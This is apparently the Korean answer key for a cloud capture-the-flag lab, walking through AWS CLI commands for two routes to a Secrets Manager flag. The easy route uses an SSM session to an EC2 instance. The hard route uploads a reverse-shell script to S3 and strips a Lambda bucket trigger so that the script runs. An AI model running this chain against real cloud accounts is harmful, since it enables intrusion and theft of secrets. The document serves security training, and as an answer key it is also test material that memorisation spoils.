# [cloud_secret_exfil] 모범 답안

## Easy Route
1. 최초 제공된 2개의 자격 증명 중에서 easy route의 자격 증명을 이용하여 프로파일을 등록한다.
```bash
aws configure --profile easyroute
```

2. 먼저 사용자에 대한 정보를 확인한다.
```bash
aws sts get-caller-identity --profile easyroute
```

3. 해당 사용자의 인라인 정책을 확인한다.
```bash
aws iam list-user-policies --user-name attacker-user-2 --profile easyroute
```

4. 해당 인라인 정책의 권한을 확인하여 ssm관련 권한이 있는 것을 확인한다.
```bash
aws iam get-user-policy --user-name attacker-user-2 --policy-name attacker-user-policy-2 --profile easyroute
```

5. ssm 세션을 시작하기 위해 session-manager plugin을 설치한다.
```bash
curl -o session-manager-plugin.deb https://s3.amazonaws.com/session-manager-downloads/plugin/latest/ubuntu_64bit/session-manager-plugin.deb

sudo dpkg -i session-manager-plugin.deb

session-manager-plugin
```

6. 접속할 인스턴스의 id를 확인한다.
```bash
aws ec2 describe-instances --query "Reservations[].Instances[].InstanceId" --output text --profile easyroute
```


7. ssm 세션을 시작하여 ec2내로 접속을 한다.
```bash
aws ssm start-session --target <ec2id> --profile easyroute
```


8. SecretsManager의 비밀 목록을 확인한다.
```bash
aws secretsmanager list-secrets
```

9. Secret을 확인하여 비밀 FLAG를 획득한다.
```bash
aws secretsmanager get-secret-value --secret-id secretFLAG-OrcAHYV87Uuzb1KB
```
<br/><br/>
## Hard Route
1. 최초 제공된 2개의 자격 증명 중에서 easy route의 자격 증명을 이용하여 프로파일을 등록한다.
```bash
aws configure --profile hardroute
```

2. 먼저 사용자에 대한 정보를 확인한다.
```bash
aws sts get-caller-identity --profile hardroute
```

3. 해당 사용자의 인라인 정책을 확인한다.
```bash
aws iam list-user-policies --user-name attacker-user-1 --profile hardroute
```

4. 해당 인라인 정책의 권한을 확인하여 lambda관련 권한 및 s3 업로드 권한 있는 것을 확인한다.
```bash
aws iam get-user-policy --user-name attacker-user-1 --policy-name attacker-user-policy-1 --profile hardroute 
```

5. 리버스 쉘 스크립트를 작성한다.
```bash
sudo vi exec.sh
```

6. 해당 파일을 s3내에 업로드한다.
```bash
aws s3 cp exec.sh s3://kcloudlab-cloud-secret-exfil-s3bucket/exec.sh --profile hardroute
```
- 이때 성공적으로 실행되지 않아 아무 사건이 발생하지 않는다.

7. Lambda 함수 트리거중에 S3 버킷 트리거가 있는지를 확인한다.
```bash
aws s3api get-bucket-notification-configuration --bucket kcloudlab-cloud-secret-exfil-s3bucket --profile hardroute
```

8. S3 버킷에 연결된 lambda 트리거를 삭제하기 위해 먼저 설정을 백업한다.
```bash
aws s3api get-bucket-notification-configuration --bucket kcloudlab-cloud-secret-exfil-s3bucket > a.json --profile hardroute
```

9. 백업한 설정에서 LambdaFunctionConfigureations 부분을 삭제한다.
```bash
sudo vi a.json
```

10. 수정한 설정 파일을 다시 덮어써서 설정을 변경한다.
```bash
aws s3api put-bucket-notification-configuration --bucket kcloudlab-cloud-secret-exfil-s3bucket --notification-configuration file://a.json  --profile hardroute
```

11. 다시 한 번 리버스 쉘을  s3내에 업로드하면 된다. 그러면 EC2에 접속할 수 있다.
``bash
aws s3 cp exec.sh s3://kcloudlab-cloud-secret-exfil-s3bucket/exec.sh --profile hardroute
```

12. SecretsManager의 비밀 목록을 확인한다.
```bash
aws secretsmanager list-secrets
```

13. Secret을 확인하여 비밀 FLAG를 획득한다.
```bash
aws secretsmanager get-secret-value --secret-id secretFLAG-OrcAHYV87Uuzb1KB
```



`flag` : FLAG{congratulations}
